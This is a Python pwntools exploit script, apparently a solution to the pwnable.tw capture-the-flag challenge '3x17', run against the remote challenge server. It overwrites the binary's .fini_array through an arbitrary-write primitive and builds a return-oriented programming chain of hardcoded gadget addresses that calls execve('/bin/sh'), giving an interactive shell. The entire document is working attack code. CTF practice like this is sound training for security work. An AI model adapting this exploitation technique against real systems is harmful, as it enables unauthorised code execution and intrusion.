from pwn import *

DEBUG = 0

if DEBUG:
	p = process('./3x17')
else:
	p = remote('chall.pwnable.tw', 10105)

# Gadgets
syscall = 0x4022b4
pop_rdi = 0x401696
pop_rsi = 0x406c30
pop_rdx = 0x446e35
pop_rax = 0x41e4af
leave = 0x401c4b
fini_array_caller = 0x402960

# Addresses
main = 0x401b6d
fini_array_caller = 0x402960
fini_array = 0x4b40f0
offset = fini_array
bin_sh = offset + 11*8

def arbitrary_write(addr, data):
	p.sendlineafter('addr:', str(addr))
	p.sendafter('data:', data)

arbitrary_write(fini_array, p64(fini_array_caller) + p64(main))
arbitrary_write(offset + 2*8, p64(pop_rdi) + p64(bin_sh))
arbitrary_write(offset + 4*8, p64(pop_rsi) + p64(0))
arbitrary_write(offset + 6*8, p64(pop_rdx) + p64(0))
arbitrary_write(offset + 8*8, p64(pop_rax) + p64(0x3b))
arbitrary_write(offset +10*8, p64(syscall) + '/bin/sh\x00')
arbitrary_write(fini_array, p64(leave))
p.interactive()
